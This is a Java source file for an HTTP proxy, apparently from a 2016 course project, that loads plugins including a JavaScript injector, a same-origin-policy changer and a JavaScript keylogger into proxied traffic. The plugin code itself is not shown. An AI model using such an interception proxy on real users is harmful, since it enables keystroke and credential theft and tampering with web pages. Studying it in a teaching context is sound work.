package at.rkn2016.proxy;
import java.io.*;
import java.net.*;
import java.util.ArrayList;

import javax.sound.sampled.Line;

import at.rkn2016.plugins.ContentReplacePlugin;
import at.rkn2016.plugins.JavaScriptInjector;
import at.rkn2016.plugins.JavaScriptKeylogger;
import at.rkn2016.plugins.JavaScriptSameOriginPolicy;
import at.rkn2016.plugins.Plugin;
import at.rkn2016.plugins.ResponseHeaderChanger;

public class RKNProxy {
	
	static void readConfigFile() throws Exception
	{
		BufferedReader br = new BufferedReader(new FileReader(new File("../config/config.txt")));
		try {
			String[] plugins = br.readLine().split("☃");
			if(plugins[0].equals("1"))
			{
				PLUGIN_HEADER_CHANGER = true;
			}

			if(plugins[1].equals("1"))
			{
				PLUGIN_CONTENT_REPLACE = true;
			}

			if(plugins[2].equals("1"))
			{
				PLUGIN_JAVASCRIPT_INJECT_SIMPLE = true;
			}

			if(plugins[3].equals("1"))
			{
				PLUGIN_JAVASCRIPT_SOP = true;
			}

			if(plugins[4].equals("1"))
			{
				PLUGIN_JAVASCRIPT_KEYLOG = true;
			}

		} finally {
		    br.close();
		}
	}
	
	static boolean PLUGIN_HEADER_CHANGER = false;
	static boolean PLUGIN_CONTENT_REPLACE = false;
	static boolean PLUGIN_JAVASCRIPT_INJECT_SIMPLE = false;
	static boolean PLUGIN_JAVASCRIPT_SOP = false;
	static boolean PLUGIN_JAVASCRIPT_KEYLOG = false;
	
	public static ArrayList<Plugin> plugins = new ArrayList<Plugin>();
	
	static
	{
		try {
			readConfigFile();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if(PLUGIN_HEADER_CHANGER)
		{
			plugins.add(new ResponseHeaderChanger());
		}
		if(PLUGIN_CONTENT_REPLACE)
		{
			plugins.add(new ContentReplacePlugin());
		}
		if(PLUGIN_JAVASCRIPT_INJECT_SIMPLE)
		{
			plugins.add(new JavaScriptInjector());
		}
		if(PLUGIN_JAVASCRIPT_SOP)
		{
			plugins.add(new JavaScriptSameOriginPolicy());
		}
		if(PLUGIN_JAVASCRIPT_KEYLOG)
		{
			plugins.add(new JavaScriptKeylogger());
		}
	}
	
	public static void main(String[] args) throws IOException {
	    try {
	      String host = "BestProxy";
	      int remoteport = 80;
	      int localport = 8080;
	      // Print a start-up message
	      System.out.println("Starting proxy for " + host + ":" + remoteport
	          + " on port " + localport);
	      // And start running the server
	      runServer(host, remoteport, localport); // never returns
	    } catch (Exception e) {
	      System.err.println(e);
	    }
	  }

	  /**
	   * runs a single-threaded proxy server on
	   * the specified local port. It never returns.
	   */
	  public static void runServer(String host, int remoteport, int localport)
	      throws IOException {
	    // Create a ServerSocket to listen for connections with
	    ServerSocket ss = new ServerSocket(localport);

	    while (true) {
	      Socket client = null;
	      try {
	        // Wait for a connection on the local port
	        client = ss.accept();
	        new RequestThread(client).start();
	        
	      } catch (IOException e) {
	        System.err.println(e);
	      } finally {

	      }
	      
	    }
	    
	  }
	}
